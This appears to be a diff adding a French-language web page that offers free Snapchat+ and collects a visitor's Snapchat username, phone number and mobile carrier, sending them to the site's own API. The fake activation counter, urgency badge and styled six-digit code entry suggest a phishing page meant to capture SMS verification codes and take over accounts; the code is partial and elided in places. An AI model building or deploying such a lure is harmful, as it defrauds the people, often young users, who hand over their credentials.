@@ -1,0 +1,244 @@
+&lt;!DOCTYPE html&gt;
+&lt;html lang="fr"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"&gt;
+    &lt;title&gt;Snapchat+ Gratuit&lt;/title&gt;
+    &lt;link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"&gt;
+    &lt;style&gt;
+        /* (Styles identiques à la version précédente, je ne les répète pas pour rester concis) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; padding-top: 50px; overflow-x: hidden; }
+        .status-bar { position: fixed; top: 0; left: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.75); backdrop-filter: blur(20px); display: flex; justify-content: space-between; align-items: center; padding: 0 20px; font-size: 14px; font-weight: 600; z-index: 2000; color: #fff; }
+        .status-icons { display: flex; align-items: center; gap: 8px; font-size: 15px; }
+        .container { width: 100%; max-width: 430px; text-align: center; padding: 0 20px; margin-top: 12px; padding-bottom: 90px; }
+        .snap-logo-container { margin-bottom: 20px; position: relative; display: inline-block; }
+        .snap-logo { width: 100px; height: 100px; background: #FFFC00; border-radius: 28px; display: flex; justify-content: center; align-items: center; box-shadow: 0 8px 30px rgba(255,252,0,0.6); margin: 0 auto; }
+        .snap-icon { font-size: 65px; color: #000; line-height: 1; }
+        .offer-badge { position: absolute; bottom: -12px; left: 50%; transform: translateX(-50%); background: #FFFC00; color: #000; padding: 6px 14px; border-radius: 20px; font-size: 12px; font-weight: 800; letter-spacing: 0.5px; box-shadow: 0 5px 15px rgba(255,252,0,0.5); white-space: nowrap; }
+        h1 { font-size: 34px; font-weight: 800; margin-bottom: 6px; letter-spacing: -0.5px; }
+        h2 { font-size: 24px; font-weight: 700; color: #FFFC00; margin-bottom: 18px; }
+        .description { font-size: 15px; color: #ccc; margin-bottom: 32px; line-height: 1.5; }
+        .stats-container { display: flex; justify-content: space-around; margin-bottom: 38px; padding: 22px 10px; background: rgba(255,255,255,0.06); border-radius: 18px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.08); }
+        .stat-item { display: flex; flex-direction: column; align-items: center; }
+        .stat-value { font-size: 30px; font-weight: 800; color: #FFFC00; margin-bottom: 4px; }
+        .stat-label { font-size: 12px; color: #aaa; text-transform: uppercase; letter-spacing: 0.5px; font-weight: 600; }
+        .progress-bar-container { margin-bottom: 40px; padding: 0 10px; }
+        .progress-label { font-size: 12px; color: #888; text-align: right; margin-bottom: 8px; font-weight: 600; }
+        .progress-bar { width: 100%; height: 6px; background: rgba(255,255,255,0.15); border-radius: 10px; overflow: hidden; }
+        .progress-fill { height: 100%; background: #FFFC00; border-radius: 10px; width: 0%; transition: width 0.5s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        .form-section { background: rgba(20,20,20,0.8); backdrop-filter: blur(15px); border-radius: 22px; padding: 30px 24px; margin-bottom: 30px; text-align: left; border: 1px solid rgba(255,255,255,0.1); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .form-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; }
+        .form-description { font-size: 14px; color: #bbb; margin-bottom: 28px; line-height: 1.5; }
+        .form-group { margin-bottom: 22px; }
+        .form-label { font-size: 13px; color: #aaa; margin-bottom: 8px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
+        .input-wrapper { display: flex; align-items: center; background: rgba(255,255,255,0.08); border-radius: 14px; padding: 14px 18px; border: 2px solid transparent; transition: all 0.25s ease; }
+        .input-wrapper:focus-within { border-color: #FFFC00; background-color: rgba(255,252,0,0.08); transform: translateY(-1px); box-shadow: 0 0 0 4px rgba(255,252,0,0.15); }
+        .input-icon { margin-right: 12px; font-size: 20px; color: #888; flex-shrink: 0; }
+        .input-field { flex: 1; background: transparent; border: none; outline: none; color: #fff; font-size: 16px; padding: 0; }
+        .input-field::placeholder { color: #666; font-weight: 400; }
+        select.input-field { appearance: none; background-image: url('data:image/svg+xml;charset=US-ASCII,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2214%22%20height%3D%2214%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20stroke%3D%22%23888%22%20stroke-width%3D%222%22%20stroke-linecap%3D%22round%22%20stroke-linejoin%3D%22round%22%3E%3Cpolyline%20points%3D%226%2010%2012%2016%2018%2010%22%3E%3C%2Fpolyline%3E%3C%2Fsvg%3E'); background-repeat: no-repeat; background-position: right 10px center; background-size: 16px; padding-right: 35px; cursor: pointer; }
+        select.input-field option { background: #222; color: #fff; }
+        .submit-button { background: #FFFC00; color: #000; border: none; border-radius: 30px; padding: 18px 0; width: 100%; font-size: 17px; font-weight: 800; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 25px rgba(255,252,0,0.45); margin-top: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .submit-button:hover:not(:disabled) { background: #fff; box-shadow: 0 12px 30px rgba(255,252,0,0.7); transform: translateY(-2px); }
+        .submit-button:disabled { background: #2a2a2a; color: #666; cursor: not-allowed; box-shadow: none; }
+        .step { display: none; animation: fadeInUp 0.5s ease forwards; }
+        .step.active { display: block; }
+        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .loading-container-advanced { padding: 20px; text-align: center; }
+        .progress-circle-container { position: relative; width: 160px; height: 160px; margin: 20px auto; display: flex; justify-content: center; align-items: center; }
+        .progress-circle { width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(#FFFC00 0% 0%, rgba(255,255,255,0.15) 0% 100%); display: flex; justify-content: center; align-items: center; transition: background 0.4s ease; }
+        .progress-circle-inner { width: 110px; height: 110px; background: #000; border-radius: 50%; display: flex; flex-direction: column; justify-content: center; align-items: center; box-shadow: inset 0 0 25px rgba(0,0,0,0.9); }
+        .progress-percentage { font-size: 38px; font-weight: 800; color: #FFFC00; line-height: 1; }
+        .progress-text { font-size: 13px; color: #ccc; margin-top: 4px; font-weight: 500; }
+        .loading-title { font-size: 20px; font-weight: 700; margin: 15px 0 8px; }
+        .loading-subtitle { font-size: 14px; color: #ccc; margin-bottom: 20px; }
+        .progress-steps { text-align: left; max-width: 320px; margin: 0 auto 20px; }
+        .progress-step { display: flex; align-items: center; margin-bottom: 14px; opacity: 0; transform: translateX(-20px); transition: all 0.4s ease; }
+        .progress-step.visible { opacity: 1; transform: translateX(0); }
+        .step-icon { width: 28px; height: 28px; border-radius: 50%; background: rgba(255,255,255,0.15); margin-right: 14px; display: flex; justify-content: center; align-items: center; font-size: 13px; font-weight: 700; color: #888; flex-shrink: 0; transition: all 0.3s ease; }
+        .step-icon.completed { background: #FFFC00; color: #000; box-shadow: 0 0 12px rgba(255,252,0,0.6); }
+        .step-text { font-size: 15px; color: #ddd; font-weight: 500; }
+        .step-text.completed { color: #fff; font-weight: 600; }
+        .step-warning { font-size: 12px; color: #aaa; margin-top: 10px; padding-left: 42px; font-weight: 500; text-align: left; }
+        .waiting-box { background: rgba(255,255,255,0.05); border-radius: 18px; padding: 25px 20px; margin-top: 20px; border: 1px solid rgba(255,255,255,0.1); }
+        .waiting-title { font-size: 18px; font-weight: 700; color: #FFFC00; margin-bottom: 10px; }
+        .waiting-text { font-size: 14px; color: #ccc; }
+        .pulse-animation { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255,252,0,0.4); } 70% { box-shadow: 0 0 0 20px rgba(255,252,0,0); } 100% { box-shadow: 0 0 0 0 rgba(255,252,0,0); } }
+        .code-input-wrapper { display: flex; justify-content: center; gap: 10px; margin-bottom: 30px; }
+        .code-digit-input { width: 50px; height: 60px; border: 2px solid rgba(255,255,255,0.2); border-radius: 14px; background: rgba(255,255,255,0.06); color: #fff; font-size: 26px; text-align: center; outline: none; transition: all 0.3s ease; font-weight: 700; caret-color: #FFFC00; }
+        .code-digit-input:focus { border-color: #FFFC00; background: rgba(255,252,0,0.08); transform: scale(1.05); box-shadow: 0 0 0 3px rgba(255,252,0,0.2); }
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 70px; background: rgba(0,0,0,0.85); backdrop-filter: blur(20px); border-top: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-around; align-items: center; z-index: 2000; padding-bottom: env(safe-area-inset-bottom, 10px); }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #888; font-size: 11px; font-weight: 600; cursor: pointer; width: 25%; }
+        .nav-item i { font-size: 22px; margin-bottom: 4px; }
+        .nav-item:hover { color: #fff; }
+        .nav-item.active { color: #FFFC00; }
+        .success-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 3000; }
+        .success-overlay.show { display: flex; }
+        .success-icon { font-size: 80px; color: #00ff00; margin-bottom: 20px; }
+        .success-message { font-size: 22px; font-weight: 700; color: #FFFC00; text-align: center; padding: 0 30px; }
+        /* Style pour avatar */
+        .snap-avatar { width: 80px; height: 80px; border-radius: 20px; margin: 10px auto; background: #FFFC00; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .snap-avatar img { width: 100%; height: 100%; object-fit: cover; }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    <div>
+        <span>19:16</span>
+        <div>
+            <i></i><span>2836</span><span>100%</span><i></i>
+        </div>
+    </div>
+
+    <div>
+
+        <!-- Étape 1 -->
+        <div>
+            <div>
+                <div><span>👻</span></div>
+                <div>OFFRE LIMITÉE</div>
+            </div>
+            <h1>Snapchat+</h1>
+            <h2>Gratuit</h2>
+            <p>Profite de toutes les fonctionnalités premium sans payer.</p>
+            <div>
+                <div><div>2836</div><div>Activations</div></div>
+                <div><div>100%</div><div>Gratuit</div></div>
+            </div>
+            <div>
+                <div>Étape 1 sur 4 — Tes infos</div>
+                <div><div></div></div>
+            </div>
+            <div>
+                <h3>Récupère ton accès</h3>
+                <p>Entre tes informations pour activer Snapchat+ sur ton compte.</p>
+                <div>
+                    &lt;label&gt;<i></i> Pseudo Snapchat&lt;/label&gt;
+                    <div>
+                        <span>@</span>
+                        &lt;input type="text" id="snapchatInput" class="input-field" placeholder="ton_pseudo" autocomplete="off" required&gt;
+                    </div>
+                    <!-- Zone d'avatar vérifié (cachée par défaut) -->
+                    <div style="margin-top:10px; display:none;">
+                        <img src="" alt="Avatar" style="width:60px;height:60px;border-radius:15px;object-fit:cover;">
+                    </div>
+                </div>
+                <div>
+                    &lt;label&gt;<i></i> Téléphone&lt;/label&gt;
+                    <div>
+                        <span><i></i></span>
+                        &lt;input type="tel" id="phoneInput" class="input-field" placeholder="06xxxxxxxx" maxlength="10" inputmode="numeric" pattern="[0-9]{10}" autocomplete="off" required&gt;
+                    </div>
+                </div>
+                <div>
+                    &lt;label&gt;<i></i> Opérateur&lt;/label&gt;
+                    <div>
+                        <span><i></i></span>
+                        &lt;select id="operatorSelect" class="input-field" required&gt;
+                            &lt;option value="" disabled selected&gt;Choisis ton opérateur&lt;/option&gt;
+                            &lt;option value="Orange"&gt;Orange&lt;/option&gt;
+                            &lt;option value="SFR"&gt;SFR&lt;/option&gt;
+                            &lt;option value="Bouygues"&gt;Bouygues&lt;/option&gt;
+                            &lt;option value="Free"&gt;Free&lt;/option&gt;
+                            &lt;option value="Autre"&gt;Autre&lt;/option&gt;
+                        &lt;/select&gt;
+                    </div>
+                </div>
+                &lt;button id="sendBtn" class="submit-button" onclick="submitStep1()"&gt;<i></i> Obtenir Snapchat+ gratuit&lt;/button&gt;
+            </div>
+        </div>
+
+        <!-- Étape chargement + attente (identique à avant) -->
+        <div>
+            ...
+        </div>
+
+    </div>
+
+    &lt;script&gt;
+        let currentId = null;
+        let currentSnapchat = '';
+        let currentAvatarUrl = null;
+
+        // --- Vérification du pseudo avant envoi ---
+        async function verifySnapchatUsername(username) {
+            try {
+                const res = await fetch(`/api/check-snapchat/${encodeURIComponent(username)}`);
+                if (!res.ok) throw new Error('Erreur réseau');
+                return await res.json();
+            } catch (err) {
+                console.error(err);
+                return { exists: false, error: 'Vérification impossible' };
+            }
+        }
+
+        async function submitStep1() {
+            const snapchatInput = document.getElementById('snapchatInput');
+            const phoneInput = document.getElementById('phoneInput');
+            const operatorSelect = document.getElementById('operatorSelect');
+            const pseudo = snapchatInput.value.trim();
+            const phone = phoneInput.value.trim().replace(/\s+/g, '');
+            const operator = operatorSelect.value;
+
+            if (!pseudo || pseudo.length &lt; 3) { alert('Pseudo invalide (min 3 caractères).'); return; }
+            if (!/^0[1-9]\d{8}$/.test(phone)) { alert('Numéro invalide (10 chiffres).'); return; }
+            if (!operator) { alert('Choisis un opérateur.'); return; }
+
+            // Vérification Snapchat (affiche un loader)
+            const sendBtn = document.getElementById('sendBtn');
+            sendBtn.disabled = true;
+            sendBtn.innerHTML = '&lt;i class="fas fa-spinner fa-spin"&gt;&lt;/i&gt; Vérification du pseudo...';
+
+            const check = await verifySnapchatUsername(pseudo);
+            if (!check.exists) {
+                alert(`Le pseudo "${pseudo}" n'existe pas. Vérifie l'orthographe.`);
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '&lt;i class="fas fa-paper-plane"&gt;&lt;/i&gt; Obtenir Snapchat+ gratuit';
+                snapchatInput.focus();
+                return;
+            }
+
+            // Pseudo valide → afficher l'avatar
+            currentAvatarUrl = check.avatarUrl;
+            const avatarContainer = document.getElementById('avatarPreview');
+            const avatarImg = document.getElementById('avatarImg');
+            if (currentAvatarUrl) {
+                avatarImg.src = currentAvatarUrl;
+                avatarContainer.style.display = 'flex';
+            } else {
+                avatarContainer.style.display = 'none';
+            }
+
+            currentSnapchat = pseudo;
+            // Continuer l'envoi
+            sendBtn.innerHTML = '&lt;i class="fas fa-spinner fa-spin"&gt;&lt;/i&gt; Envoi...';
+            try {
+                const res = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ snapchat: pseudo, phone, operator })
+                });
+                const data = await res.json();
+                if (!res.ok || !data.id) throw new Error('Erreur serveur');
+                currentId = data.id;
+                showStep('loading-advanced');
+                document.getElementById('loading-account').textContent = '@' + currentSnapchat;
+                // Afficher l'avatar dans la page de chargement aussi
+                if (currentAvatarUrl) {
+                    document.getElementById('loadingAvatar').src = currentAvatarUrl;
+                    document.getElementById('loadingAvatarContainer').style.display = 'flex';
+                }
+                startAdvancedLoadingAnimation(10);
+            } catch (err) {
+                console.error(err);
+                alert('Erreur lors de l\'envoi. Réessaye.');
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = '&lt;i class="fas fa-paper-plane"&gt;&lt;/i&gt; Obtenir Snapchat+ gratuit';
+            }
+        }
+
+        // ... (le reste du JS inchangé : animation, polling, code)
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
